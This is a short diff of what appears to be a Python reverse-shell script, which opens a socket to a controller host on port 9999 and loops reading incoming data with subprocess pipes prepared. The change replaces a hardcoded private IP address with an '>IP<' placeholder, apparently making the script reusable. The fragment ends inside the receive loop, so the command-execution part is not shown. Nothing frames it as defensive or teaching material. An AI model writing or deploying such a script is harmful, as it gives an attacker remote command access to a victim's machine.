@@ -1,5 +1,5 @@
 import os,socket,subprocess
-s,h,p,g=socket.socket(),'192.168.1.10',9999,subprocess.PIPE
+s,h,p,g=socket.socket(),'>IP<',9999,subprocess.PIPE
 s.connect((h,p))
 while True:
     d = s.recv(1024)
